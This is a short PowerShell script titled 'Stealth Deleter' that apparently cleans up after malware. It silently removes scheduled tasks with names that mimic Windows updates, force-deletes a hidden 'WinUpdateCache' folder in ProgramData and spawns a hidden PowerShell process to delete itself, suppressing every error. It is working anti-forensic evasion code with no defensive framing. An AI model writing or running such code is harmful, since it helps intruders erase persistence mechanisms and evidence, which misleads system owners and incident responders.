# ===[Stealth Deleter]===
$scriptFolder = "$env:ProgramData\WinUpdateCache"
$scriptPath = $MyInvocation.MyCommand.Path
$taskNames = @(
    "WinDriverUpdate_Task",
    "SecuritySync_Task",
    "UpdateCache_Task"
)

# Remove scheduled tasks silently
foreach ($task in $taskNames) {
    try {
        Unregister-ScheduledTask -TaskName $task -Confirm:$false -ErrorAction SilentlyContinue
    } catch {}
}

# Remove script folder and contents silently
try {
    if (Test-Path $scriptFolder) {
        Remove-Item -Path $scriptFolder -Recurse -Force -ErrorAction SilentlyContinue
    }
} catch {}

# Self-delete: spawn hidden PowerShell to remove this file
Start-Sleep -Milliseconds 500
Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"Start-Sleep -Milliseconds 500; Remove-Item -Path '$scriptPath' -Force`"" -WindowStyle Hidden
v